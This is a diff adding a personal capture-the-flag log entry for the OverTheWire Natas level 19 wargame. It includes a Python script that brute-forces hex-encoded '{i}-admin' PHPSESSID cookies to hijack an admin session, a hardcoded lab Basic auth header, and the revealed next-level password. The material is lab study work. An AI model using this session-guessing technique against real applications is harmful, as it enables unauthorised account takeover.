@@ -632,6 +632,44 @@ Done!
 
 ## 19->20
 - http://natas19.natas.labs.overthewire.org/
-- `natas20:`
+- `natas20:p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw`
 - 2025-06-24: Break Day
 - 2025-06-25: Break Day
+- Similar to last level, but session IDs are no longer sequential. From looking at the cookie, looks like they are hex versions of `{i}-admin`. Updated script to send requests to brute force try `{1...1000}-admin`
+- Tools: https://gchq.github.io/CyberChef/#recipe=To_Hex('Space',0)&input=NzEtYWRtaW4
+- References: https://nils-maeurer.de/post/overthewire-natas18-19/
+```python
+import requests
+import time
+
+auth_header = {
+    'Authorization': 'Basic bmF0YXMxOTp0bndFUjdQZGZXa3hzRzRGTldVdG9BWjlWeVpUSnFKcg==',
+}
+
+url = 'http://natas19.natas.labs.overthewire.org'
+
+for i in range(280, 300):
+    admin_str = f"{i}-admin"
+    hex_str = admin_str.encode('utf-8').hex()
+    print(f"Trying {admin_str} with hex {hex_str}")
+    cookie = {"PHPSESSID": hex_str}
+    resp = requests.request(method='POST', url=url, headers=auth_header, cookies=cookie)
+    time.sleep(0.1)
+    # print(resp.text)
+    if "You are an admin" in resp.text:
+        print(resp.text)
+        break
+```
+```
+<body>
+<h1>natas19</h1>
+<div id="content">
+<p>
+<b>
+This page uses mostly the same code as the previous level, but session IDs are no longer sequential...
+</b>
+</p>
+You are an admin. The credentials for the next level are:<br><pre>Username: natas20
+Password: p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw</pre></div>
+</body>
+```
